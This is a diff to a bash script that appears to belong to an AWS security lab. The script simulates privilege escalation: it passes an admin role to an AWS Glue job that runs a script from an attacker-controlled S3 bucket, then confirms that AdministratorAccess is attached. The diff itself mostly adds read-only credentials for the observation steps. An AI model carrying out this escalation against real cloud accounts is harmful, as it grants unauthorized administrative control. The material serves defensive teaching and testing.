@@ -68,6 +68,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Retrieve readonly credentials for observation steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 if [ -z "$AWS_REGION" ]; then
     echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
@@ -76,22 +85,32 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
-echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# Step 2: Verify starting user identity
+echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
-# Verify starting user identity
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
@@ -102,15 +121,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# Step 3: Get account ID (using readonly creds)
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
 # Step 4: Verify lack of admin permissions
-echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+echo -e "${YELLOW}Step 4: Verifying starting user doesn't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -135,14 +156,14 @@ echo "Script S3 path: $SCRIPT_S3_PATH"
 echo "Script bucket: $SCRIPT_BUCKET"
 echo ""
 echo -e "${BLUE}ℹ Attack Simulation Note:${NC}"
-echo -e "${BLUE}  The Python script was pre-uploaded by Terraform to a bucket in this account for demonstration.${NC}"
-echo -e "${BLUE}  In a real attack, this would typically be an attacker-controlled S3 bucket in another${NC}"
-echo -e "${BLUE}  account that grants public read access. The starting user can read from this bucket${NC}"
-echo -e "${BLUE}  via a bucket policy (not IAM permissions), simulating access to a public attacker bucket.${NC}"
+echo -e "${BLUE}  The Python script is hosted in an attacker-controlled S3 bucket. The bucket policy${NC}"
+echo -e "${BLUE}  grants the prod account read access (not via IAM, but via resource policy).${NC}"
+echo -e "${BLUE}  If an attacker account is configured, this bucket lives in a separate AWS account.${NC}"
 echo ""
 echo -e "${GREEN}✓ Retrieved script location from Terraform${NC}\n"
 
 # Step 6: Create Glue job with admin role
+use_starting_creds
 echo -e "${YELLOW}Step 6: Creating Glue job with admin role${NC}"
 echo "This is the privilege escalation vector - passing the admin role to Glue..."
 TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
@@ -188,7 +209,9 @@ fi
 echo "Job Run ID: $JOB_RUN_ID"
 echo -e "${GREEN}✓ Job run started successfully${NC}\n"
 
+# [OBSERVATION]
 # Step 8: Wait for job completion
+use_readonly_creds
 echo -e "${YELLOW}Step 8: Waiting for Glue job to complete${NC}"
 echo "Monitoring job status (checking every 5 seconds)..."
 
@@ -196,7 +219,7 @@ MAX_WAIT=300  # 5 minutes
 ELAPSED=0
 
 while [ $ELAPSED -lt $MAX_WAIT ]; do
-    show_cmd "Attacker" "aws glue get-job-run --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --run-id \"$JOB_RUN_ID\" --query 'JobRun.JobRunState' --output text"
+    show_cmd "ReadOnly" "aws glue get-job-run --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --run-id \"$JOB_RUN_ID\" --query 'JobRun.JobRunState' --output text"
     JOB_STATUS=$(aws glue get-job-run \
         --region $AWS_REGION \
         --job-name "$GLUE_JOB_NAME" \
@@ -236,11 +259,28 @@ echo "IAM changes can take up to 15 seconds to be effective..."
 sleep 15
 echo -e "${GREEN}✓ Policy propagation complete${NC}\n"
 
+# [OBSERVATION]
 # Step 10: Verify admin access
+use_readonly_creds
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
+echo "Checking if AdministratorAccess is now attached to starting user..."
+
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER\" --query 'AttachedPolicies[*].PolicyArn' --output text"
+ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
+    --user-name "$STARTING_USER" \
+    --query 'AttachedPolicies[*].PolicyArn' \
+    --output text 2>/dev/null)
+
+if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
+    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER${NC}"
+else
+    echo -e "${RED}✗ AdministratorAccess policy not found on $STARTING_USER${NC}"
+    exit 1
+fi
+echo ""
 echo "Attempting to list IAM users..."
 
-show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
